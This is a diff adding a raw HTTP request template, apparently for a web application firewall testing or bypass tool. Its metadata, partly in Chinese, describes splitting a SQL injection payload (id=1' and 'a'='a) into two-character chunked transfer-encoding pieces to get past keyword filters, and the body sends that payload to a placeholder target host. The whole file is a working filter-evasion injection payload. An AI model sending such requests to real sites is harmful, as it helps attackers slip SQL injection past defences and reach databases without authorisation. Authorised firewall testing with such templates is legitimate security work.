@@ -1,0 +1,32 @@
+# @name: chunked-split
+# @color: violet
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @tags: chunked编码分割payload，每2字符一个chunk，绕过关键词匹配；payload: id=1' and 'a'='a
+# @intent: chunked_split_body
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @intent.chunk_size: 2
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+2
+id
+2
+=1
+2
+' 
+2
+an
+2
+d 
+2
+'a
+2
+'=
+2
+'a
+0
